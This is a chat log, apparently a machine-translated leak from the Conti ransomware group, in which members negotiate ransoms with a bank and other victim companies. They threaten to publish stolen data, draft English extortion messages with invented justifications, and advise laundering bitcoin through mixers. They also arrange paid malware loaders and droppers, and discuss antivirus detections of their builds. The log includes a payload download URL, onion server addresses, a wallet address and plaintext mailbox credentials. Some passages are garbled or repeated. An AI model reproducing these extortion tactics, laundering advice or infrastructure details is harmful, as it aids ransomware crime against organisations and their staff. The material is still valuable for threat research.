I need you to give me some pointers on SYR
so far their software is screwed up (
and gypsies
soon have to tell the terms and conditions
so I'll be ready
SYR - 255srv | 6VCentr/49EsxI |46M + 43M (dnb) - 121M (zoom) |
gypsies is tko ?
Huu...
Hungarians
short
so how much SYR did you put out originally, don't you remember?
SYR - did they get 2500 or 3000?
HOULEELEC - gypsies?
yes

how much is that?
what is dnb
bro, let's answer the bank

cool
dnb don't know what it is
maybe it's just a reference to the source of the rhubarb data, dnb.no
Could be.
So 45M.
here?

I think to take 3% and the amount will be for them.

No, why?
There's a bug in the code somewhere, I'm looking for it.


Let me check my place.
Did you make the key?
all done
SSH_KEY="/var/www/.ssh/ip_rules_id_rsa"
It connects and overwrites the file.
Okay.

no comments or anything.

there just might be more than one, that's why they did it that way.

The whole system consists of 3 parts - html file and two more files (appxbundle and appinstaller)
When we were casting, we kept all 3 of them on one host and used them that way.
I could give you all 3 parts as well as the 2 files (appbundle and appinstaller) hosted on an azure host (like we did) and you get the html file
It is not so important for the test now, I can give you the html file too.
but for the release to understand.
I can host everything.
For the test, let's have the html.
Okay.
The test server's already been uploaded.
When it's ready, I'll give you the html.

we have two companies are quiet, and they are big
AGDG and ACNE
how to get them to talk, any thoughts?

They don't respond to calls.
Maybe the caller should get a hold of them.
Okay. .
Then just put out the data?

I understand that these fuckers probably deleted the encrypted files and left with nothing. So they need to upload their data somewhere, give them the codes and go fuck themselves.

Do you know if the bug is fixed?
Hi. tell me the bug is not fixed yet?
you knocked the can off really fast.
I was leaving room for maneuvering
To get it down to 4.
5200-5-4600-4300-4
now it's 4,500 and I don't know.
and they only got 1750.
Fuck, that's a pretty steep drop in the can.
I was leaving room for maneuver
to get it down to 4.
5200-5-4600-4300-4
Now it's 4,500 and I don't know.
and they only have 1750
[12:05:35] <skippy> fuck, that's a pretty steep drop in the can
[12:05:44] <skippy> I was leaving room for maneuver
[12:05:49] <skippy> to get it down to 4
[12:06:01] <skippy> 5200-5600-4300-4
[12:06:11] <skippy> now it's 4500 and dz
[12:06:20] <skippy> and they only have 1750
well, i thought up to 4 at most
then all
50% and cross
i.e. from the bank we have to get 4k
I don't think we can get more than that
Oh, yeah?
and now they'll give us 2.
поэтому сле.4400-4300-4200-4000)))
that's how it is

Mm-hmm.)
Comic books have been paid for
I don't want to drag this out
Yeah. .
I got paid last night at 2:00 a.m.
No, the bank is such that they're just stalling.
It was a good day yesterday.
No
See
the bank.
Here's what I'm suggesting.
I made a deal with the Germans just like that.
4k - 50% and that's it guys, we close the bidding.
next thing you know, we're putting the data out there.
and that's it.
You could do that.
But it's after the weekend anyway.
Otherwise it'll be until the second coming.
Yeah, not...
It's usually a week.
They have one more day today.
They can't do it in a day.
So we'll have to wait till Christmas.
And we still got 250,000 bucks to go. Those motherfuckers.
They're not talking .
I don't think they will.
I also got the fuck out of here yesterday.
We have a BAG in the panel.
and those companies that don't write us, they just can't write, there's a bug in the panel
that's how the fuck it turned out
fuck
today the programmer has to fucking fix it
yeah
if they don't translate I'm telling you
and i already fucking posted 40% of it.
Yesterday I hid everything.
counting you gave us 750k
Yeah.
We need to give them a hard time
that if they don't pay out 250k today for example
tomorrow the data will be online and thank you for your gift))
They have time.
until Friday.
And that information is there.
It's the last day the banks are open.
That's their problem
and from Thu to Mon they have days off
))
well, yeah
Shake the decider, let him pay your salary.
It's so decent there.
and you'll get even better.)
he sent me 19 yesterday
for two Target.
That's cool.
I'm expecting 16 today.)
and today's about the same.
yeah
Yeah, and I got 20 for three.
guuuut!)
What do you think, a million and a half of wood?
yes, i'll close the loans before the new year and go into the holidays as a human being without debts)
12k paid off, another 12k in December, and that's it.)
And started saving for a square.
You're good.)
already made a preliminary deal on the purchase of land
I will finish it next week) and the beginning is done
can put a tent and live already)

no one's gonna kick the bitch out
yeah yeah!)
the next thing i'm gonna build is a bathhouse
with a guest room to sleep in
and then I'll get to work on the house.)
man, this is a hell of a plan!))
need at least 3 bits for everything

yeah, same thing
you haven't saved up yet?
2/3 of the house is supposed to be like this
saved up
finished it yesterday.
construction?
not
the piggy bank
)
the right amount to take to the leger)
yeah)
so yeah, the bitcoin is down right now
not profitable to withdraw it
I think it will bounce by New Year
and then it will be possible
I'll take it right away.
to usdt
leger to usdt?
Yeah. .
Of course
It does, yeah.
Can you get the bit on leger?
it's just an ether token
usdt
Btz yes.
I accept leger.
I'd like to transfer what I've saved up to leger into btz.
and then when it's higher, I can transfer it to usdt
Is that okay?
Sure. .
i.e. i assume i select which crypto to support via app, right?
yes
and i set up a wallet on it.
you choose a few.
yeah
well, i'll just choose btz and usdt.
all
and I'll send each other.)
I've got usdtz and ether.

It can't.
Aether is for commissions.
It's not a fucking exchange.
on usdt.
It can
There's an exchange.
I mean, you have to put ether
and tre20 to use
but in any case - from btz to monero must first
I've got the bit already clean.
only ers20
on the Ledger will be
Ledger's.
okay
well that's a bad thing they did, the exchange is much better in this case
I don't trust the exchange as a wallet.
for storage.
I agree
where is the exchange built in? in the app?
Yeah
But I don't use it.
I mean, I can transfer from the app to usdt directly.
But how do I get the air?
Probably .
♪ the exchanger ♪
Btz air.
Not like that. It doesn't automatically transfer from Btu to usdt.
you need to have money on the air, right?
You need the money on the air to send usdt.
It takes a commission from the airwaves.
That's it, it's clear now. It's all tied to the ether.
just like blockchain.
of course
a token is a token
I see. Yeah, it's at least $25 for each tranche.
and you can wait for who knows how long, you can wait 24 fucking hours.
I mean, you don't know how long.
2-3 minutes.
That's the longest it's ever been.
2-3 minutes.
I mean, I don't know how long.
never more than that.
I'm having trouble with the AV detects again. generic is clean and rundll32 is dirty.
So far to build only generic?

hmm
answer?
What about the ones in the tree?
the ones you didn't find?
Two yes.
no
They are not.
There aren't even any folders.
I looked up the tree.
Ah, so they're yanking randomly again.
Yeah. .
bitches
Same answer.
They took a look at the tree.
and gave a couple of files from it and the rest that aren't there
Not random.
I think they're real.
They just weren't downloaded.
They didn't leak them all.
So they're trying to figure out what we have
and how relevant.
Yeah, I get it.
Well, that's great, if it's fixed.
Then today there will be those who couldn't get through

Good point.
Let the bitches be afraid.

They seem to be rare motherfuckers, they deleted all the encryption files)
now they're asking for credentials and access to their data
this needs to be done by everyone or else the toad will stop working for you

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know if it's OK.

We will agree to your offer of $1,150,000 USD to be paid in BTC. In exchange, CONTI will provide decryption for 100% of our environment and will immediately provide credentials to our documents in cloud storage. In addition, CONTI will agree not to sell, publish or distribute our data. Lastly, CONTI and your associates will never victimize us again.  DO YOU AGREE?

Trumpy, what's your schedule for the weekend?
Trump, you're confusing something: qAmF6OnohObDVKqjIQ2QWPOCBsiCHCIUYdbMZW6qHKcbv4ZSqwctvrpxNlGhtu9M - I don't see that anywhere, not in the first panel or the second.

[ERROR: This message is encrypted and you are unable to decrypt it.]

What's up with the silence so far?
I sat for half a day yesterday.
replied

It's quiet.
and made blogs on the newbies
When you reply, please pay more attention
There's a lot of typos and grammar.
it's important for us to be impeccable
in detail
Yeah. .
then
it's the little things.
You messed up there.
where?)
when the file tree offered
for future reference
Before you suggest it, ask.
and look at the amount of data
to whom
BSCR
I had to make up shit not to send it to you.
there's almost no data, and the ones that are there are all old))
2016-2018.
fuck)
i couldn't even blog on them
it's all fucking bullshit.
so keep in mind here
there's even a phrase about file three
fuck
and the mistakes and stuff, that's bullshit.
well you have to avoid it somehow
otherwise it's a fiasco.
if they realize that we don't have any fucking data))
:-D
and the faggots who paid part of it, the floyd, are in no hurry to pay the rest of it
I gave them till tonight.
so I'll put it out tonight
and fuck it
I'll fuckin' post it tonight if they don't pay the rest

Right
[ERROR: This message is encrypted, and you are unable to decrypt it.]
And the fucking panel
it replaces the characters itself with some bullshit.
finally the password was discarded and the panel replaced it)
it's fucked up.
and i also have a suspicion that not everyone can still write in the chat room
I do not know how to check it
but I have a deep conviction, otherwise where is DOMKIS?
they asked for the decrypt
and disappeared after changing the panel
as well ACNE
something strange.
it replaces the sign '
acne tested
and not only
look at the password)
copy and paste
you'll end up with a completely different one.
although there's no apostrophe there

Yep.
I don't care if it's a prft.
I still don't know what it's replacing.
yes, it's better to send passwords and other stuff via prvnote
+++
Copy that.
the main thing today is not to fuck up the bank
we need to get them up to 4k
what do they got
а
Yeah.)
There you go.
the rest are kind of petty, but I also think this week we'll choke
http://198.244.193.210/images/wolf.png
rob141 exe
where did you say I have a bad writing?
it seems everywhere normal
OK, We give you 3 days, after 3 days we wait the payment and no more time requests from you.
OK, we give you 3 days more to make a payment. No more additional time requests.

Sorry, but we cannot give you the files list, because remote server breaks connection all the time. But we have your data from bscrna1-fs1 and WILKERSON-NUC servers, so you can evaluate your data.

we are waiting for your offer till tomorrow. The offer must be satisfying for the both sides.

 - your data will be published in 17 hours.

Your data will be published tonight evening, if YOU don&#39;t pay.
:)
a lot of a lot
OK, all except the last one.
Yeah, I missed the preposition.
or simpler - today's evening
yes the apostrophe is glazing the panel
pyf.)
I know
yes
then just today)
let them row
today at the ev
at 9:10 p.m.)
whatever you want.
Well, yeah.
as long as the grammar is not lame
I've forgotten a lot of things, the last time I used English written in 2008)
&#39; - apostrophe
yeah)
#38; - and what is this symbol?
and replaced it twice.
let me see.
check it out)
https://ascii.cl/htmlcodes.htm
it's a &
pass: #%Cbgc(#QT&#38;*$YXQW6cbyhf
here's the password.
#38;
&#38;
this fuckin' thing was added.
instead of what?
#%Cbgc(#QT&*$YXQW6cbyhf
is this what the password is supposed to be?
da, dumayu da
or without the &
?
vot etogo ne znayu)

Skippy, I'm gonna be leaving soon, so I need you to back me up.

but so far, there's been a deadly silence.)
By the way, I figured out the USDT on the Ledger.)
[Error: message encrypted and can not be decrypted.]
it does, but only when you choose to exchange
then it shows that it supports USDT over the air)
So all is normal!

Thanks for the backup.
I see the bank responded, man.
while I was gone.
That's okay.
I should have given them more time.)
It's okay.)
I'll get the files.
they're already fucked with time)
nlbuse
ok
Already found it.
The bank doesn't give a fuck about time.
They're working.
Nah, they're in a hurry.
They restored everything.
those guys are pros.
They don't need a decryptor.
They restored it, they restored it.
but they don't want to spill their date
they want to get the fuck away from us))

yeah
well yeah
that's what's holding them back)) otherwise they'd tell us to fuck off

honestly i don't think we can take 4
i don't think we're gonna get 4.
3 to 3.3 would be good.
I hope so.
Okay. .
If tramp is in, it means we won't go below 3k
Sure. .
ok, but i'd keep them busy, there's not much left before christmas))
yeah, we need to get a good score by january
I'm still on vacation at the beginning of January.
I think we're all on vacation
till mid-January.
Mm-hmm.)
What, are you flying somewhere?
No, bro.
I can't afford to go yet.
I want to buy a quad.
but I haven't made any money for it yet.
That's true, too.)
but not for another month)
just today made a gift to myself
finally bought a laptop
handsome)
yes, happy))
you can score a square in a month
here
I just bought an iphone at home, too.
I've wanted one my whole life.)
Yeah, you can, but I would if I had 1%.
I'm not quite there yet.
I'll get it.)
i also got an american)
razer
nice beeches
yeah
I love it.
I could only dream about that before

same thing
With the SIM card?
I have 4G.
no, I mean in the laptop sim card is inserted?
Or only through a whistle?
No
I don't think so.
I don't see it.
I'm looking for another one of these.
only through a whistle like that.
hp is getting tired of
so why would you
it's better via whistle.
for work.
then threw it away and bought a new one.
whistle in the bag does not fit)
than you can light your laptop
plugged in
I'm changing the notebooks anyway.
I have the same mac address available to the whistle.
fit, if the bag on more))
[Error: the message is encrypted and can not be decrypted.]
[Error: message encrypted and can't be decrypted.]
Well, .
I have a favorite.
♪ leather one ♪
my wife gave it to me.
ahahah notebooks for her size)
[Error: message encrypted and cannot be decrypted.]
[Error: Message encrypted and cannot be decrypted.]
Well, you can afford to switch laptops all the time now.
and you can change the mac address, just so you know.)
Yeah, I know.)
I just don't know how.
I'll teach you if you want)
It's a piece of cake.)
Yeah, that'd be good.)
there's a program that does everything automatically.)
linux?
there's one for linux and vinux
but on macs don't know)
cool
because I never had any.
i don't use mac for work
never
it's purely a home station
well yeah)
what inch screen?
27
27
Or bigger?
yeah
I don't think the imacs are bigger.
the new ones are 24.
I don't know anything here)
Well either the screen buy them separately, but I don't need one.
Yeah, of course.
I'm not a designer or a renderer)
So, tramp said yes.
need to finish with the bank
++
Otherwise we'll overcompensate and they won't fucking pay at all.

I don't see what you wrote here?

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know if it's OK.

hi
same problem again
no our softwares
????
we need a decrypt from them, but it's difficult for fluit, they can't decrypt linux files
so they will never pay us the rest.
empty messages are coming in
hi
yeah i read the chats
it's not going well with these guys lately
before everything was fine
it's just that when you sit tight every day and people fuck up, it's not a good thing
it's after the fuck up that it started
man, do you have a way to get a decryptor from them?
if it was that easy i'd be decrypting it myself
that's their bread and butter.
okay.
we'll just have to wait.
Unfortunately, there's nothing else to do.
Over the New Year holidays I will write my own encryption software and in a month we will start working on our own software
we need to close these issues faster
and we'll have our own panel and all our own stuff
i fuckin' hate it when it's freezing!
well great, maybe you'll give me a 1% raise there)
I agree with you about the cold.
it's not a job.
i suggest we don't fuck with the bank anymore, now they'll make an offer and we'll settle for what we've got
Yeah, I'll raise it.
let them pay out.
on the HKI.
Did you see that?
you already get 1% with my bonuses
didn't you?
how much they offered?
then i will cancel all bonuses at once)
yeah! with your bonuses, bro.
thank you for that.
i say we don't fuck with the bank anymore, now they'll make an offer and go with what they have
 That's right, or they're gonna bail.
I gotta warn Skippy.
Your one percent comes out that way.
or he'll overbid them.
You're making as much as Skippy, don't worry.
Yeah, I guess so, bro.
I mean, I get it.
I didn't think so.
I wish you'd get your panel done so we can do the carpentry work ourselves.
We've already started.
we'll write day and night
It's gonna be okay.
I'm not sorry bro, thank you for getting me out of the swamp, at least I can breathe
It's just the software itself that's important
It's the encryption that's important.
It's gonna be a lot of trouble.
We'll get through this
but it's doable
yeah there's still a lot of work to be done
I can test your software
if necessary
If we make the software even faster, we'll go by ourselves.
Yesterday I made a present for myself
bought myself a laptop
so now I can put the virtual machines to good use
Hbs
congratulations
well done!
Thank you. You're sorry.)
Well, it was a once in a lifetime gift.)

You've got to put the money through the mixer.
and then output it.
You'll be more careful.
Yeah, I skip everything.
The most dangerous thing in this business is this money.
No exceptions.
The main thing is not to be fucked over by the mixer.
That's what I'm afraid of.
the only thing they'll be looking for is the withdrawal of the money.
the main thing is not to fuck with the mixer
 The mixer also pours all kinds of bullshit
it's not clear what others are pouring into it

they're supposed to be fucking monitoring that.

Yep.

wanted to see ... looked)
everything hangs
nothing opens
Well, it's special.

It's a mess...
No kidding.
it will be a big trouble if these two softwackers don't show up.... with decrypt then we'll be screwed
That's probably the worst thing that could happen. They barely made it out of BSCR as it is.
yes they will.

[19:17:13] <22> okay.
[19:17:33] <veron> it was not for work
[19:17:40] <veron> you didn't even showed me ready solution.)
[19:17:51] <veron> we were supposed to check everything
[19:18:05] <veron> we didn't even spam
[19:18:07] <22> I was wasting my time. There was no specific TOR.
[19:18:21] <veron> now I'll bring up the story )))
[19:19:18] <22> now it's satisfactory asks docs for other links. even two docs. you want to see my story ?) 10 pages long. wrong picture or something else)
[19:19:23] <22> wrong weight
[19:19:35] <veron> what did you think )
[19:19:39] <22> and every edit goes to the whole doc
[19:19:43] <veron> 5k more )
[19:19:56] <veron> in general you want to work?
[19:19:58] <22> it's normal . I'll work one week and that's it.

[19:20:21] <22> and today
[19:20:23] <veron> if yes, we agree with each other, if not, sorry


1,5 k work it all out
[19:20:46] <veron> that's not good
[19:21:14] <veron> we didn't spam
[19:21:14] <veron> we tested your solution under us
[19:21:15] <veron> you were making changes
[19:21:32] <veron> work it out for us


and no more questions
[19:21:53] <veron> i.e. as we agreed to do every day to each dock, burned or blocked links change
[19:22:03] <veron> during the day
[19:22:13] <veron> 5 days - and gone
[19:22:33] <veron> otherwise in the group where you are, you will be removed and you won't work with anybody else there
[19:23:17] <veron> waiting for decision, 1,5 refund

ok 200 bucks for the tests
[19:23:21] <veron> 1,3k back
[19:23:26] <veron> we'll find others
[19:24:59] <veron> actually give it back, I don't want to work with such attitude, I don't like to work with such people if you're like that from the beginning
[19:25:03] <22> yeah what group
[19:25:19] <veron> it doesn't matter, will you return the money ?
[19:25:27] <veron> 1,3 k

hi
wow
why
So look, according to the bank - as soon as they give us an answer with payment - we agree

Got it. .
Because they don't have a date at all.
8GB.
We won't get anything out of them
We should have at least 1300)
There's a high risk of overkill on the bank.
That's why we agree on their price

We're so okay.

Yeah.)
What's your answer?
I don't know yet, I'm thinking.
but I'm not sure 110k is good enough.
Yeah, I don't know either.
but basically we only have a decryptor.
Yeah, there's no data at all, I couldn't even do a blog.
Fuck.)
there's nothing but crap from 2016-18.
I mean, it's garbage.
bad
that's why it's dangerous to lead to the data

that's why we need to be careful somehow
another thing - they wrote that they can restore most of the data themselves
uh-huh
you can play the idiot, of course

It's like 110k isn't enough

Well, yeah.
No, not saying anything
like our decryptor is worth at least 700k
just give me an amount.
No.
and plus a guarantee of 200k that we'll kill everything.
just say that the decryptor costs more, even just the development
i.e. just 110k is not enough give more?
like 100k isn't enough?
even just a pentest for a company their size costs more
not to mention the work and guarantees
but we're understanding
That's why here's a discount
That'll be eight dollars.
Yeah, the sooner we get through with them the better.
It's good if we can get 500k.)

I think so too.
I think 400 to be honest.

Guys, you evaluate the our team very low, $100,000 for us is not money. Just development of our decryption tools (for Windows and Linux OS) cost more than $500,000. Our guarantee of wiping data has its own price. We give you some discount and our price for you will be $800,000.

Sirs, it seems like you are evaluating our work too low. Even a simple pentest for a company like yours will cost more than you offer. Multi-platform decryptor development, work of a lot of people... Plus our guarantees are not free, as you understand.

However, we understand your harsh situation. You checked an info about our organization and it looks like a positive trait. So, we are ready to make you a discount: from now, your price is 800,000 USD.
vot tak
Go ahead.
I'm just confused.
one thing
pentest no one asked to do)))
that's why I didn't want to write anything about the pentest
so you did)
ahah
well the answer is asked, we did not ask to pentest, why should we pay for it)
that's my point
come on who cares?
We didn't ask for it.
it's already done
and like they'll get the report
after they pay for it.
they don't get a fucking report except for the decryptor.
well we'll give them the report)

like we're spam.

Take the builds from the paranoid.
You were a little too hasty with the bank.
You should have said 2800.
i had to say 2800 and it was too early to say 2800. well we decided from the beginning we would accept their next offer. and i think they were right, because they were already losing interest, there might not have been a next offer.
tramp, better a bird in the hand than a crane in the sky)
300k will not play a significant role here, but it's a fact! Remember how you were nervous and wrote where the fuck the bank is)
i knew i could get them again, but this is the last one!
ok, polemics, you have to remember that greed will kill you.
just trust my experience.
So, bank +, HKI +, fluid +
They'd go up to 2,800.
Waiting for 2500.
All right.
who else are we missing?

I understand, no distractions, just tell me yet Floyd did not spread the money?
There's 250k
Not yet.
And there was 750k before that.
I don't think they've been disbursed either.
or i don't know, i'm confused
750k - that's already been distributed and you got paid for it.
ok
SGIDC bid 11.3k, i wonder how much they'll offer. maybe they'll get at least 5k

hi
here
It's probably dead by now, you need a new one.
Land is still alive, surprisingly.
but the files there definitely need to be updated
I'm thinking of upgrading everything to make it cleaner for the AV)
pouring today?
trampich, HOULEELEC asks about the price
what shall we give them?
if i am not mistaken you gave them somewhere around 7 or 8 million
right?
hello
Do you remember how much they charged Huulecu
I wanted to tell them it's time to pour the fluid.
but no, they paid for it.
ytn
no
they paid.
yep)
huulecu don't remember
 do you remember how much they charged Huulecu?
they need a price urgently
[16:23:15] <fire> hululu do not remember
if memory serves me right it was 7 or 8 million
minus 20%
let's screw them 5.5k with all discounts
what do you think?
did you look at their turnover?
Like 274 million.
Hmm. .
Well, you know that's not a realistic amount of money.
Well, it's okay.
Okay. .
What do we write?
So-and-so.
5.5.
Yeah. .
Okay. .
I'll check it out.
Then with all the discounts, it's 5.5k.
All right?
I was eating.
Let me see what they had.
274 million.
You said in your chat room.
Yeah. .
Then with all the rebates, it's 5.5k. Yes, that's right.
Go to .
Okay. .
Thanks. .
And they were published?
No
I kept them on hold

and they're fresh.
Uh-huh.
the latest
yeah
$5,500,000
I already fucked up.
Go to .
If they pay at least $3,000,000 it'll be fine.
I don't think they can afford more than that.
that's just a conditional offer.
it's actually a lot less, you know that, right?

hi
Well we will wait )
I think they already have a definite solution
the new panel will start knocking now guys
i remember exactly what was 8 million
They already put four nets on the new panel.
cool
Six more nets in the works.
We've got to get them done before Christmas.
10 or more nets a week.
10+
Holy shit!

well done
Let's make the most of it.
yeah
I take it we're going on vacation.
or how do we do it as a team?
hihi
Yes, we will have a couple of weeks off for sure.
We'll see how the guys feel about the state of the team.
ok
Last years we had a month off.
New Year's Eve.
Yeah, not bad.
we were off from december 25 - 28 all put out, i stayed in touch because i did the targeting myself
and in February, we'd launch at the beginning of the month.
That's the plan for this year as well.
I'm gonna help you out.
Next year.
now 10+ a week and everything will be as good as last year
Well, I'm not taking any time off anyway.
Yeah, of course.
Maybe next year will be lucky.
I don't know what the other teams are doing and going off
They're only losing $
Well it seems that the team leaders are getting cold feet.
it's a good thing we have less competition
Or they know more than we do
i still do not understand how they figured out the IP address of the server where the previous panel was
it means that in the nodes of the torus there are their own servers
and somehow we got into them
could have gotten into a bad node
I raise specially such nodes
it may be the same here
yep
it's all bullshit
the main thing is the guys got it up and we didn't fuck up the targets

you can change it for sure, it's working and up to date.

say full file tree you only get after payment if you refuse 30%

well yes
yes, under the system
or let's shit the date.
what else?
skippy where
the bot cooled off?
what language the system's in, that's what the installer's in.
yeah, i knocked it off.
you deleted yourself?
i don't know about you. i wasn't looking.)

I can only give you the accounts tomorrow.
Okay. .
I first ran with this vm - there was this ip
now ran (but the ip is already 86.105.9.13) and he knocked on the bot
You don't want to do this.

Don't you get it?

Yeah, I got it.
You need to hold your ground.
It's okay.
Okay.

hi
I took a break from Trampy today.

Okay, thanks.
But problem, friend.
Thanks. .

hello
hello
who are you? why did you add yourself?
I don't know, it's kind of a work thing. I was added to do xls.
Oh. Okay.
Hi.
here?
Doc, you want to test it?
I take it we need to discuss this with you?
Yeah, you can talk to me.
What were the terms of the deal with Ford again?
i need you to get a dock for one of our adversaries on a subscription basis, but i need it to always be on a regular schedule
Usually monday to monday morning.
10:11 a.m. Moscow time.
Well look generally I do 400 per build, but with your saport agreed that on a regular basis will be for 300
Yeah, I'm willing to work that way without a hitch.
super great
Veron@ add it.
for him to do
I can't get him to pay for it.
he's got a looder out there that's not too fancy on crypto
emoteed if you heard)
You'll agree with him on what date you'll start.
and to me about the payment

i'm the local sheriff :)
I got it )
Did Ford tell you who we are and so on?
no
and if it's not important to me, i figured you're a grid operator

the trike gang we are

etc.)
Yeah )
so I heard.
well
Our software isn't too complicated, there's no particular nuances
if only by the entry points on the dll
but we usually tell you if there are peculiarities
are you only building docks or what else do you do?
Yeah, I can do vbs and js too.

are you any good at js?
i really need a good js coder)
Not really, I just have my own coder to help me out when I need it.
Got it
Ask him if he'd be willing to do a gs looder for us.
and how much it would cost
I've got one.)
you just a dropper?
or just a lowader?
have a clip?
yes i do, i have a looder but the executable itself can be vbs js xls and doc and hta
What's the anchor? Your own looder?
It's a resident bot, so it won't disappear after you restart your PC
 Resident of course.
great
Do you download it yourself?
does anyone else work on it?
i'm the only one who does google traffic on it now
dino@ will dock it for you when you're ready to test it
The dock is fine, I've never seen a better one.
Copy that. .
I added your guy, but he's probably not online right now.
I have a team that needs a fix for one of my teams.
Isn't there any way to arrange a job/rental?
He doesn't answer often, he's busy.
On Mon-Fri most likely.
.
He said we're starting today.
Oh.
great)
we've been waiting for him for a month now...
I'll give another guy - test the loafer with him, if he is satisfied then we can work on this topic too
Hi
Ok, now I'll do what to pay you once a month payment or what?
You'll get a message from me
with a Lowder
Anything you want, hta ws vbs
Test it please let me know if you like it
dylon@
oh, shit!
dylon@
it's for the loafer.
Pay as you go.
Usually everyone gets paid twice a month on the 1st and 15th
but we can do it any way you want, just once a day.
I'm just not always available, if anything will have to wait
during the day there +-
dino@
add it
Do you want payment now or when? He just said to get the dock ready for him.
Just for the test, I already did it for you.
Are you still here?
if i do your grids what percentage can i get?
I'm here.
Sorry I got distracted.
I'll pay for it right now. Leave it to me.
He didn't test it, my testers and Ford did.
[Error: Message encrypted and can't be decoded.]
I'll pay for the inconvenience just to make him happy :)
for nets usually 25 for nets with hell and 15 for nets without hell, as long as we do everything
date, lock, negotiation, osint etc etc
[ERROR: This message is encrypted, and you are unable to decrypt it.]
But if you're with us for a long time, we'll give you a percentage.
[ERROR: This message is encrypted, and you are unable to decrypt it.]
30 and 20 can be done, but not immediately, at least there the first 3 payments need to get
when you lock, we give you ID and access to the chat on your user, you can watch the dialogs, whether or not the grid is online
but you do not have to write anything, there are trained people sitting there, they know what they are doing
i can just rent a locker if you have your own hackers
[ERROR: This message is encrypted, and you are unable to decrypt it.]
[ERROR: This message is encrypted and you are unable to decrypt it.]
not me it is easier to work with you I just if there will be grids will give
bc1qdvmlyvaq46e53r8y6e4cyj4pq8cdf8fukj82x0
Yeah ok, either text me or I'll give them the teamlid of some hackers - they can directly
dillon can by the way
ocean
he's a good guy to start with
and there if you need more people, we have a lot of hands
ok
purse thrown
a couple of minutes
I put in 2k, let's see how it goes and then we'll figure it out.

HOULEELEC
yes
What did he send?
now
hi
hi)
you're fucked up all right.
not .
was yesterday
I told you.
I was this morning.
all right.
Conti team - we have 2 cases with you that client paid and you did not deliver. Who to speak to, email, telegram, tox, irc whatever works because clients are beginning to believe you do not deliver. Can you reach out to me miroslavpopov1980@outlook.com

or this is not good and we have to tell clients you are not trustworthy and we prefer not to do that.
tramp@q3mcco35auwcstmt.onion
that's the text they wrote in the prvnt.
I need these woofers.
I can't really understand
What clients is he talking about?
Who did we not give what to? but took the money?
Is this about us?
Are you busy now?
Well, you need to write to them at the post, but I do not really understand why and what to write.
I don't know, I'm curious myself.
Looks like somebody got screwed by Sonti.
Let's write. Yeah.
A couple of companies.
from their words.
Make a post office for them.
2 cases
okay
Let's find out who they're talking about and what they did to the conti
I'll create an e-mail.
Okay. .
Let's get access to it later.
and we'll text them.
Okay.
then when these guys get here we'll talk to them
+
 this is the negotiator who negotiates from several companies
he knows something
We need to get some information out of him.
We'll find out. Okay.
It's not good that someone does that.
Yeah. Exactly.
It'll be very difficult if we lose our trust.
It's a reputation.
Of course
and now it has not yet affected the result of this particular ratchet, but maybe it's just a delay in solving the issue
let's find out
fillemand@protonmail.com : sgffj*&^#Jji%#^&$
text them right away.
then i'll just write that we're a team and you asked us to contact you by email.
yes
ask who they're talking about?
and add which two cases they are talking about let them explain in more detail and say we're willing to help
Okay
I write to this box? miroslavpopov1980@outlook.com
Yeah. Yeah.
by the way, they squeezed more or less out of BSCR
da
everyone needs to be squeezed like that
skippy said it wouldn't make it 300k
))
well it worked!)
Well, Mater's got to write!
Let him write and it's still up to me to decide
Well, I was the one who wrote it.
I'm the one who's got to push everybody and they're all fucked up.
I know how they stick to it.
yeah yeah you wrote I see
)) We'll get 'em all.
the main thing is to keep them in contact
there's a new tagger in the chat room and they don't post
this is weird
bro, you know better than that
there are a lot of places where backup storages were unavailable and they were breaking them all over
Why is it not written?
so i can install the system
well that would explain why
yeah
Trying to rebuild from backup.
but there are those on their knees
They haven't written yet.
Well, let's wait.
analyzing
Patience, bro.
We'll put two more today and then we'll rest until Mon.
That's for this week.
cool.
will be online soon
but there's not a lot of contact

Who are the blogs for?
when they come out you will do ъ
ok
Well, we should do them all.
Then I'll make some blanks.
If we publish something, they will know where to write anyway
large there are networks here?
INT-MYCHOICE
462M
SOLERPALAU
DTSEE
they are under special control
Oh, man.
did you see the bit fall
asshole
TECHNORD is still good
I was just about to save up for a quad.
and then fuck it, it just dropped like that.
you emailed me?
yes
crypto
that's fine.
take your time.
It'll grow back.
You know what confuses me?
Why is this box with a russian first and last name?
miroslavpopov1980@outlook.com
Doesn't that freak you out???
No, as a reverser.
You can only go through the torus on the proton.
Yeah, sure.
I mean, he's been sitting around trying to come up with an email.
Thinking about what to call it when I'm communicating with the russians !)
Google Russian names and come up with one.
maybe it's the russian negotiator
who works there
he went to a foreign country and found himself in the field of negotiation
they are not stupid there either.
Have you been to Yusa yourself?
nerve
No. .
i've never been.
Have you?
Well, it's okay.
I only studied in England.
Don't be embarrassed.

Have you been? - No, and I'm not going to. I watch movies.)
I would destroy all those Anglo-Saxons and Austro-Hungarians long time ago)
Why not?)
I can't stand them because
there's a lot of geezers in our country
they are what they did to you )
Churks are different
That's some fucked up shit.
History friend, history
They didn't do anything to me personally)
russia is a third world country because of this shit.
i see on the net.... you beat 3 germans
yeah
tough
there will be trouble again)
they are all greedy bitches
i was in germany
i hope they don't get any more abuses
(i was in germany))
how is it?
ok
i was collecting bottles
to get by
we all did it when we were kids
a lot of experience)
I'm not a kid, bro.
all these nets are gonna be knocking in the new panel?
I see, so you've found the right job for you now.
we're all simple guys from very simple families who lived poorly.
That's right!!! The main thing is that your team does not fall apart and stop working
Everything that's happened to you has happened to us.
That's why I understand you.
We will only fall apart when I say STOP! =))
When are you going to say it?
hopefully not soon?
i know it's not forever.
we'll leave together.
as long as there's no ruckus about the job, we're working.
As soon as they start fixing it, we'll fold.
Okay. .
I get it.
Well, then you'll get back together anyway.
♪ as soon as it calms down ♪
Let's see
But it's a long story.
It's gonna be around for a few years.
Those who founded it, they're long gone.

Yeah.
I can imagine
But leaving people behind isn't good either.
Before covid, it was many times higher.
Yeah. .
I can't stand cheaters.
Well, it happens.
They're the founders.
They left beautifully.
they could take what they had because they helped many people to work and showed them everything
I have not heard much about them, I generally in life - I do not like liars and cheats
I do not condemn them took it
